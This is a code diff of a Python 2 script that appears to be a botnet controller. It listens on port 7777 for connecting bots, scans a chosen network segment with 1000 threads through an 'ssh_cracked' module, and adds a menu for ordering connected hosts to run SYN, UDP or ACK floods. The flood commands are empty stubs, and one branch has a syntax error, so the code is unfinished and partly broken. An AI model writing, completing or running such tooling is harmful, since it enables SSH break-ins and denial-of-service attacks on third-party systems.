@@ -6,22 +6,30 @@ import socket
 import Queue
 import netaddr
 import threading
-import socketserver
+
 
 def useage():
     print '''-h or --help   **---Help function
              -l or --alive  **---View the current live host
              -s or --scan   **---Scarch the network segment
+             -a or --attack   **---Perform an attack
     '''
+def useage_command():
+    print '''Please choose your attack mode:
+             -S or --syn    **---syn flood
+             -U or --udp    **---udp flood
+             -A or --ack    **---ack flood
+    '''
+
 live_host=Queue.Queue()
 target_host=Queue.Queue()
 server_listen_list_queue=Queue.Queue()
-server_listen_list_th=Queue.Queue()
+search_results=Queue.Queue()
 
 def socket_listen():
     global live_host
     server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    server.bind(('127.0.0.1',7777))
+    server.bind(('192.168.9.118',7777))
     server.listen(10000)
 
     while True:
@@ -32,23 +40,23 @@ def main():
     global live_host
     global target_host
     global server_listen_list_queue
-    global server_listen_list_th
+    global search_results
+
 
     Current_path=os.getcwd()
     try:
         sys.path.append(Current_path+'/modules')
     except:
-        print ''
+        print 'import Error!'
         sys.exit(0)
     else:
         import ssh_cracked
 
+
     for i in range(5):
-        server_listen_list_queue.put(threading.Thread(target=socket_listen))
-    while not server_listen_list_queue.empty():
-        server_listen_th=server_listen_list_queue.get()
-        server_listen_th.start()
-        server_listen_list_th.put(server_listen_th)
+        th=threading.Thread(target=socket_listen)
+        th.start()
+        server_listen_list_queue.put(th)
 
 
     while True:
@@ -59,11 +67,38 @@ def main():
         elif command == '--alive' or command =='-l':
             print str(live_host.qsize())+'Host computer'
         elif command == '--scan' or command=='-s':
-            Net_list=netaddr.IPNetwork(command)
+            ip_network_segment=raw_input('Please enter the segment you want to search for:')
+            Net_list=netaddr.IPNetwork(ip_network_segment)
             for Net in Net_list:
                 target_host.put(str(Net))
-            threading.Thread()
-
+            for i in range(1000):
+                th=threading.Thread(target=ssh_cracked.scan,args=(target_host,search_results))
+                th.start()
+        elif command =='-a' or command =='--attack':
+            if live_host.empty():
+                print 'There is no currently no host available'
+                continue
+            useage_command()
+            command_choice=raw_input('Please enter you choice:')
+            l_h_q=Queue.Queue()
+            if command_choice == '-S' or command_choice =='--syn':
+                while not live_host.empty():
+                    l_h=live_host.get()
+                    l_h[0].sendall('')
+                    l_h_q.put(l_h)
+            elif command_choice == '-U' or command_choice =='--udp':
+                while not live_host.empty():
+                    l_h=live_host.get()
+                    l_h[0].sendall('')
+                    l_h_q.put(l_h)
+            elif command_choice == '-A' or command_choice =='--ack'
+                while not live_host.empty():
+                    l_h=live_host.get()
+                    l_h[0].sendall('')
+                    l_h_q.put(l_h)
+            while not l_h_q.empty():
+                x=l_h_q.get()
+                live_host.put(x)
 
 
 if __name__ == '__main__':
